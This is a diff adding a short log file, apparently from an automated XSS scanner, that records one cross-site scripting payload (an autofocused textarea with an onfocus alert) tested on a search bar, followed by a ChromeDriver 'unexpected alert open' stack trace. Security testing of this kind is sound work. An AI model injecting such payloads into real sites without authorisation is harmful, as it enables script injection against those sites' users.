@@ -1,0 +1,28 @@
+# Error XSS Payloads - 2025-06-28 05:20:37.958994
+# Payload | Expected Behavior | Actual Behavior | Context | Test Context
+<textarea onfocus=alert(1) autofocus><![CDATA[alert(1) | Alert expected | Test failed after retries | Error: Alert Text: 1
+Message: unexpected alert open: {Alert text : 1}
+  (Session info: chrome=138.0.7204.49)
+Stacktrace:
+	GetHandleVerifier [0x0x7ff786a86f65+76917]
+	GetHandleVerifier [0x0x7ff786a86fc0+77008]
+	(No symbol) [0x0x7ff786839dea]
+	(No symbol) [0x0x7ff78684a939]
+	(No symbol) [0x0x7ff78685178a]
+	(No symbol) [0x0x7ff78682608d]
+	(No symbol) [0x0x7ff786849e11]
+	(No symbol) [0x0x7ff7868e0535]
+	(No symbol) [0x0x7ff7868b8243]
+	(No symbol) [0x0x7ff786881431]
+	(No symbol) [0x0x7ff7868821c3]
+	GetHandleVerifier [0x0x7ff786d5d29d+3051437]
+	GetHandleVerifier [0x0x7ff786d578f3+3028483]
+	GetHandleVerifier [0x0x7ff786d7588d+3151261]
+	GetHandleVerifier [0x0x7ff786aa182e+185662]
+	GetHandleVerifier [0x0x7ff786aa96ef+218111]
+	GetHandleVerifier [0x0x7ff786a8fae4+112628]
+	GetHandleVerifier [0x0x7ff786a8fc99+113065]
+	GetHandleVerifier [0x0x7ff786a76c68+10616]
+	BaseThreadInitThunk [0x0x7ffea560e8d7+23]
+	RtlUserThreadStart [0x0x7ffea749c34c+44]
+ | search_bar
